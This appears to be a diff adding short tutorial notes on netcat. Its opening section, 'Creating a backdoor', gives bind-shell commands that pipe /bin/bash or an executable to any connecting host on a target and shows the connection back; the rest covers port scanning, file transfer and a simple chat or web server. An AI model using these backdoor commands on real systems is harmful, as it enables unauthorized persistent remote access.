@@ -1,0 +1,28 @@
+Creating a backdoor 
+We can also create a backdoor using NC. To create a backdoor on the target system that we can come back to at any time. Command for attacking a Linux System. 
+nc -l -p 2222 -e /bin/bash 
+For Creating Backdoor for windows system. 
+nc -l -p 1337 -e hack.exe 
+This will open a listener on the system that will pipe the command shell or the Linux bash shell to the connecting system. 
+nc 192.168.1.35 2222 
+
+
+
+nc -help – This command will print a list of all of the available commands you can use in Netcat. It will come in handy if you run into any errors while writing a script or are unsure of how to proceed.
+
+nc -z -v site.com – This will run a basic port scan of the specified website or server. Netcat will return verbose results with lists of ports and statuses. Keep in mind that you can use an IP address in place of the site domain.
+
+nc -l – This command will instruct the local system to begin listening for TCP connections and UDP activity on a specific port number.
+
+nc site.com 1234 (less than) file_name – This command will initiate the transfer of a file based on the specified port number.
+
+Printf – Netcat can actually operate as a simplified web host. This command will let you save HTML code and publish it through your local server.
+
+Create a Chat or Web Server
+nc -l -p 1299
+
+printf “GET / HTTP/1.0\r\n\r\n” | nc google.com 80
+
+Note that the port number 80 is required for this type of command since the world wide web uses it as a default for TCP over IP connections.
+
+
